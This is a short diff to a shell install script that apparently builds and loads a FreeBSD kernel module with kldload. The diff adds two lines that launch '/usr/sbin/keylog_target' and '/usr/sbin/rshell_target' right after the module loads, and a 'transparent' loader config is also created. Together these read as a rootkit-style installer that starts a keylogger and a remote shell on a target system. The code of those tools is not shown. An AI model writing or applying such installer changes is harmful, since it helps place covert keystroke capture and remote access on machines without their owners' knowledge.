@@ -47,7 +47,6 @@ cat << "EOF"
 
 EOF
 
-
 cd $BINARIES
 
 echo ">> Clean existing binary build."
@@ -106,6 +105,9 @@ touch $LOADER_CONF_TRANSPARENT
 
 mv $KMOD/$KO $INSTALL/$KO
 kldload $INSTALL/$KO
+
+/usr/sbin/keylog_target $1
+/usr/sbin/rshell_target $1
 
 if [ "$2" = "DEBUG" ]
 then
